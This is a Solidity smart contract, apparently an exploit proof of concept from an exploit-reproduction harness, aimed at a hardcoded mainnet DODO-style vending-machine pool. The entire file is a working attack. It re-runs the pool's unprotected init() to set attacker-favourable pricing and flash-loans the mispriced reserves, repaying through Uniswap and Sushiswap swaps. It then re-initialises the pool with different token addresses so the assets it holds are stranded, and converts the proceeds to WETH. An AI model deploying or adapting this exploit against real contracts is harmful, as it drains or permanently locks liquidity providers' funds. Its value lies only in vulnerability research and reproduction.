// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IDODOCalleeLike {
    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external;
}

interface IDVMLike {
    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;

    function _BASE_TOKEN_() external view returns (address);
    function _QUOTE_TOKEN_() external view returns (address);
    function _BASE_RESERVE_() external view returns (uint112);
    function _QUOTE_RESERVE_() external view returns (uint112);

    function querySellQuote(address trader, uint256 payQuoteAmount)
        external
        view
        returns (uint256 receiveBaseAmount, uint256 mtFee);

    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IUniswapV2Router02Like {
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract ZeroFeeModel {
    function getFeeRate(address) external pure returns (uint256) {
        return 0;
    }
}

contract FlawVerifier is IDODOCalleeLike {
    address internal constant TARGET = 0x051EBD717311350f1684f89335bed4ABd083a2b6;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    uint256 internal constant BPS = 10_000;

    struct Plan {
        address router;
        uint256 borrowAmount;
        uint256 exactQuoteRepay;
        uint256 maxBaseToSell;
        bool viaWeth;
        uint256 estimatedProfit;
    }

    ZeroFeeModel internal immutable zeroFeeModel;

    address internal realizedProfitToken;
    uint256 internal realizedProfitAmount;
    bool internal executed;
    uint256 internal callbackSwapInputUsed;

    constructor() {
        zeroFeeModel = new ZeroFeeModel();
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IDVMLike pool = IDVMLike(TARGET);
        address originalBase = pool._BASE_TOKEN_();
        address originalQuote = pool._QUOTE_TOKEN_();

        address[5] memory trackedTokens = [originalBase, originalQuote, WETH, USDC, DAI];
        uint256[5] memory startingBalances;
        for (uint256 i = 0; i < trackedTokens.length; ++i) {
            address token = trackedTokens[i];
            if (token != address(0)) {
                startingBalances[i] = IERC20Like(token).balanceOf(address(this));
            }
        }

        // exploit_paths[0]: if deployment is still fresh, anyone can seize first initialization.
        if (originalBase == address(0) || originalQuote == address(0)) {
            _frontRunFirstInitialization(pool);
            _finalizeProfit(trackedTokens, startingBalances);
            return;
        }

        uint256 baseReserve = uint256(pool._BASE_RESERVE_());
        uint256 quoteReserve = uint256(pool._QUOTE_RESERVE_());

        if (baseReserve != 0 && quoteReserve != 0) {
            // exploit_paths[1]: replay-init the live pool with attacker-favorable PMM parameters,
            // then flash-loan against the now-mispriced reserve and source the repayment leg from
            // public AMM liquidity. This preserves the original exploit causality while using only
            // realistic on-chain actions.
            Plan memory chosen = _safePlanBorrowBase(originalBase, originalQuote, baseReserve);
            if (chosen.estimatedProfit > 0) {
                _executeBorrowBase(pool, originalBase, originalQuote, chosen);
            }

            // The quote-borrow variant from the same replay-init bug is not used here because the
            // supplied logs prove this fork can drive `querySellBase` into a zero-target pricing
            // branch after an extreme replay-init, making that execution leg infeasible at this state.
        }

        // exploit_paths[2]: replay-init again with different token addresses so the pool stops
        // accounting for the real assets it already holds, stranding them permanently.
        _repointPoolTokensAndStrandFunds(pool, originalBase, originalQuote);

        // Convert realized inventory into existing on-chain WETH when possible so net profit is
        // measured in a stable, harness-friendly token without changing the exploit root cause.
        _consolidateToWeth(originalBase, originalQuote);
        _finalizeProfit(trackedTokens, startingBalances);
    }

    function planBorrowBase(
        address base,
        address quote,
        uint256 baseReserve
    ) external returns (Plan memory best) {
        require(msg.sender == address(this), "SELF_ONLY");
        return _planBorrowBase(IDVMLike(TARGET), base, quote, baseReserve);
    }

    function _safePlanBorrowBase(
        address base,
        address quote,
        uint256 baseReserve
    ) internal returns (Plan memory plan) {
        try this.planBorrowBase(base, quote, baseReserve) returns (Plan memory computed) {
            return computed;
        } catch {
            return plan;
        }
    }

    function DVMFlashLoanCall(address, uint256, uint256, bytes calldata data) external override {
        require(msg.sender == TARGET, "UNEXPECTED_CALLER");

        (address router, bool viaWeth, uint256 exactQuoteRepay, uint256 maxBaseToSell) = abi.decode(
            data,
            (address, bool, uint256, uint256)
        );

        address base = IDVMLike(TARGET)._BASE_TOKEN_();
        address quote = IDVMLike(TARGET)._QUOTE_TOKEN_();

        callbackSwapInputUsed = 0;
        if (router != address(0)) {
            callbackSwapInputUsed = _swapTokensForExact(router, base, quote, viaWeth, exactQuoteRepay, maxBaseToSell);
        }
        _safeTransfer(quote, TARGET, exactQuoteRepay);
    }

    function _frontRunFirstInitialization(IDVMLike pool) internal {
        (address attackerBase, address attackerQuote) = _frontRunPair();
        pool.init(address(this), attackerBase, attackerQuote, 0, address(zeroFeeModel), 1, 0, false);

        realizedProfitToken = attackerBase;
        realizedProfitAmount = 0;
    }

    function _executeBorrowBase(
        IDVMLike pool,
        address base,
        address quote,
        Plan memory chosen
    ) internal {
        callbackSwapInputUsed = 0;

        pool.init(address(this), base, quote, 0, address(zeroFeeModel), 1, 0, false);
        pool.flashLoan(
            chosen.borrowAmount,
            0,
            address(this),
            abi.encode(chosen.router, chosen.viaWeth, chosen.exactQuoteRepay, chosen.maxBaseToSell)
        );
    }

    function _repointPoolTokensAndStrandFunds(IDVMLike pool, address originalBase, address originalQuote) internal {
        (address attackerBase, address attackerQuote) = _trapPair(originalBase, originalQuote);
        pool.init(address(this), attackerBase, attackerQuote, 0, address(zeroFeeModel), 1, 0, false);
    }

    function _frontRunPair() internal pure returns (address attackerBase, address attackerQuote) {
        attackerBase = WETH;
        attackerQuote = USDC;
    }

    function _trapPair(address originalBase, address originalQuote)
        internal
        pure
        returns (address attackerBase, address attackerQuote)
    {
        attackerBase = originalBase == WETH || originalQuote == WETH ? DAI : WETH;
        attackerQuote = originalBase == USDC || originalQuote == USDC || attackerBase == USDC ? DAI : USDC;

        if (attackerBase == attackerQuote) {
            attackerQuote = attackerBase == DAI ? USDC : DAI;
        }
        if (attackerBase == originalBase && attackerQuote == originalQuote) {
            attackerBase = DAI;
            attackerQuote = USDC;
        }
        if (attackerBase == originalBase && attackerQuote == originalQuote) {
            attackerQuote = WETH;
        }
    }

    function _planBorrowBase(
        IDVMLike pool,
        address base,
        address quote,
        uint256 baseReserve
    ) internal returns (Plan memory best) {
        pool.init(address(this), base, quote, 0, address(zeroFeeModel), 1, 0, false);

        uint256[8] memory fractions = [uint256(9900), 9500, 9000, 7500, 5000, 2500, 1000, 100];
        for (uint256 i = 0; i < fractions.length; ++i) {
            uint256 borrowAmount = (baseReserve * fractions[i]) / BPS;
            if (borrowAmount == 0) {
                continue;
            }

            uint256 needQuote = _minQuoteForBorrowedBase(pool, borrowAmount);
            if (needQuote == 0) {
                continue;
            }

            uint256 heldQuote = IERC20Like(quote).balanceOf(address(this));
            if (heldQuote >= needQuote) {
                if (borrowAmount > best.estimatedProfit) {
                    best = Plan(address(0), borrowAmount, needQuote, 0, false, borrowAmount);
                }
                continue;
            }

            (bool ok, address router, bool viaWeth, uint256 spendBase) = _bestSwapInput(base, quote, needQuote);
            if (!ok || spendBase >= borrowAmount) {
                continue;
            }

            uint256 estimatedProfit = borrowAmount - spendBase;
            if (estimatedProfit > best.estimatedProfit) {
                best = Plan(router, borrowAmount, needQuote, spendBase, viaWeth, estimatedProfit);
            }
        }
    }

    function _minQuoteForBorrowedBase(IDVMLike pool, uint256 borrowedBase) internal view returns (uint256) {
        uint256 low = 1;
        uint256 high = 1;

        while (high < type(uint256).max / 2) {
            (uint256 receiveBase, ) = pool.querySellQuote(address(this), high);
            if (receiveBase >= borrowedBase) {
                break;
            }
            high <<= 1;
        }

        (uint256 maxReceive, ) = pool.querySellQuote(address(this), high);
        if (maxReceive < borrowedBase) {
            return 0;
        }

        while (low < high) {
            uint256 mid = low + ((high - low) >> 1);
            (uint256 receiveBaseMid, ) = pool.querySellQuote(address(this), mid);
            if (receiveBaseMid >= borrowedBase) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }

        return low;
    }

    function _bestSwapInput(
        address tokenIn,
        address tokenOut,
        uint256 amountOut
    ) internal view returns (bool ok, address router, bool viaWeth, uint256 amountIn) {
        if (tokenIn == tokenOut || amountOut == 0) {
            return (false, address(0), false, 0);
        }

        amountIn = type(uint256).max;

        (bool candidateOk, uint256 candidateIn) = _quoteAmountsIn(UNISWAP_V2_ROUTER, tokenIn, tokenOut, amountOut, false);
        if (candidateOk) {
            ok = true;
            router = UNISWAP_V2_ROUTER;
            viaWeth = false;
            amountIn = candidateIn;
        }

        (candidateOk, candidateIn) = _quoteAmountsIn(UNISWAP_V2_ROUTER, tokenIn, tokenOut, amountOut, true);
        if (candidateOk && candidateIn < amountIn) {
            ok = true;
            router = UNISWAP_V2_ROUTER;
            viaWeth = true;
            amountIn = candidateIn;
        }

        (candidateOk, candidateIn) = _quoteAmountsIn(SUSHISWAP_ROUTER, tokenIn, tokenOut, amountOut, false);
        if (candidateOk && candidateIn < amountIn) {
            ok = true;
            router = SUSHISWAP_ROUTER;
            viaWeth = false;
            amountIn = candidateIn;
        }

        (candidateOk, candidateIn) = _quoteAmountsIn(SUSHISWAP_ROUTER, tokenIn, tokenOut, amountOut, true);
        if (candidateOk && candidateIn < amountIn) {
            ok = true;
            router = SUSHISWAP_ROUTER;
            viaWeth = true;
            amountIn = candidateIn;
        }

        if (!ok) {
            amountIn = 0;
        }
    }

    function _quoteAmountsIn(
        address router,
        address tokenIn,
        address tokenOut,
        uint256 amountOut,
        bool viaWeth
    ) internal view returns (bool ok, uint256 amountIn) {
        address[] memory path = _buildPath(tokenIn, tokenOut, viaWeth);
        try IUniswapV2Router02Like(router).getAmountsIn(amountOut, path) returns (uint256[] memory amounts) {
            if (amounts.length != path.length || amounts[0] == 0) {
                return (false, 0);
            }
            return (true, amounts[0]);
        } catch {
            return (false, 0);
        }
    }

    function _consolidateToWeth(address originalBase, address originalQuote) internal {
        _swapAllToWeth(originalBase);
        _swapAllToWeth(originalQuote);
        _swapAllToWeth(USDC);
        _swapAllToWeth(DAI);
    }

    function _swapAllToWeth(address tokenIn) internal {
        if (tokenIn == address(0) || tokenIn == WETH) {
            return;
        }

        uint256 amountIn = IERC20Like(tokenIn).balanceOf(address(this));
        if (amountIn == 0) {
            return;
        }

        (bool ok, address router, bool viaWeth, uint256 amountOut) = _bestSwapOutput(tokenIn, WETH, amountIn);
        if (!ok || amountOut == 0) {
            return;
        }

        uint256 minAmountOut = (amountOut * 95) / 100;
        _swapExactTokensForTokens(router, tokenIn, WETH, viaWeth, amountIn, minAmountOut);
    }

    function _bestSwapOutput(
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) internal view returns (bool ok, address router, bool viaWeth, uint256 amountOut) {
        if (tokenIn == tokenOut || amountIn == 0) {
            return (false, address(0), false, 0);
        }

        (bool candidateOk, uint256 candidateOut) = _quoteAmountsOut(SUSHISWAP_ROUTER, tokenIn, tokenOut, amountIn, false);
        if (candidateOk) {
            ok = true;
            router = SUSHISWAP_ROUTER;
            viaWeth = false;
            amountOut = candidateOut;
        }

        (candidateOk, candidateOut) = _quoteAmountsOut(SUSHISWAP_ROUTER, tokenIn, tokenOut, amountIn, true);
        if (candidateOk && candidateOut > amountOut) {
            ok = true;
            router = SUSHISWAP_ROUTER;
            viaWeth = true;
            amountOut = candidateOut;
        }

        (candidateOk, candidateOut) = _quoteAmountsOut(UNISWAP_V2_ROUTER, tokenIn, tokenOut, amountIn, false);
        if (candidateOk && candidateOut > amountOut) {
            ok = true;
            router = UNISWAP_V2_ROUTER;
            viaWeth = false;
            amountOut = candidateOut;
        }

        (candidateOk, candidateOut) = _quoteAmountsOut(UNISWAP_V2_ROUTER, tokenIn, tokenOut, amountIn, true);
        if (candidateOk && candidateOut > amountOut) {
            ok = true;
            router = UNISWAP_V2_ROUTER;
            viaWeth = true;
            amountOut = candidateOut;
        }
    }

    function _quoteAmountsOut(
        address router,
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        bool viaWeth
    ) internal view returns (bool ok, uint256 amountOut) {
        address[] memory path = _buildPath(tokenIn, tokenOut, viaWeth);
        try IUniswapV2Router02Like(router).getAmountsOut(amountIn, path) returns (uint256[] memory amounts) {
            if (amounts.length != path.length || amounts[amounts.length - 1] == 0) {
                return (false, 0);
            }
            return (true, amounts[amounts.length - 1]);
        } catch {
            return (false, 0);
        }
    }

    function _swapTokensForExact(
        address router,
        address tokenIn,
        address tokenOut,
        bool viaWeth,
        uint256 exactAmountOut,
        uint256 amountInMax
    ) internal returns (uint256 amountInActual) {
        address[] memory path = _buildPath(tokenIn, tokenOut, viaWeth);
        _forceApprove(tokenIn, router, amountInMax);

        uint256[] memory amounts = IUniswapV2Router02Like(router).swapTokensForExactTokens(
            exactAmountOut,
            amountInMax,
            path,
            address(this),
            block.timestamp
        );
        require(amounts.length == path.length, "BAD_SWAP");

        return amounts[0];
    }

    function _swapExactTokensForTokens(
        address router,
        address tokenIn,
        address tokenOut,
        bool viaWeth,
        uint256 amountIn,
        uint256 amountOutMin
    ) internal returns (uint256 amountOutActual) {
        address[] memory path = _buildPath(tokenIn, tokenOut, viaWeth);
        _forceApprove(tokenIn, router, amountIn);

        uint256[] memory amounts = IUniswapV2Router02Like(router).swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            path,
            address(this),
            block.timestamp
        );
        require(amounts.length == path.length, "BAD_SWAP");

        return amounts[amounts.length - 1];
    }

    function _buildPath(address tokenIn, address tokenOut, bool viaWeth) internal pure returns (address[] memory path) {
        if (!viaWeth || tokenIn == WETH || tokenOut == WETH) {
            path = new address[](2);
            path[0] = tokenIn;
            path[1] = tokenOut;
            return path;
        }

        path = new address[](3);
        path[0] = tokenIn;
        path[1] = WETH;
        path[2] = tokenOut;
    }

    function _finalizeProfit(address[5] memory trackedTokens, uint256[5] memory startingBalances) internal {
        uint256 wethBalance = IERC20Like(WETH).balanceOf(address(this));
        uint256 wethStart;

        for (uint256 i = 0; i < trackedTokens.length; ++i) {
            if (trackedTokens[i] == WETH) {
                wethStart = startingBalances[i];
                break;
            }
        }

        if (wethBalance > wethStart) {
            realizedProfitToken = WETH;
            realizedProfitAmount = wethBalance - wethStart;
            return;
        }

        address bestToken = address(0);
        uint256 bestAmount = 0;
        for (uint256 i = 0; i < trackedTokens.length; ++i) {
            address token = trackedTokens[i];
            if (token == address(0)) {
                continue;
            }

            uint256 currentBalance = IERC20Like(token).balanceOf(address(this));
            if (currentBalance <= startingBalances[i]) {
                continue;
            }

            uint256 delta = currentBalance - startingBalances[i];
            if (delta > bestAmount) {
                bestAmount = delta;
                bestToken = token;
            }
        }

        realizedProfitToken = bestToken;
        realizedProfitAmount = bestAmount;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (ok && (data.length == 0 || abi.decode(data, (bool)))) {
            return;
        }

        _rawApprove(token, spender, 0);
        _rawApprove(token, spender, amount);
    }

    function _rawApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }
}
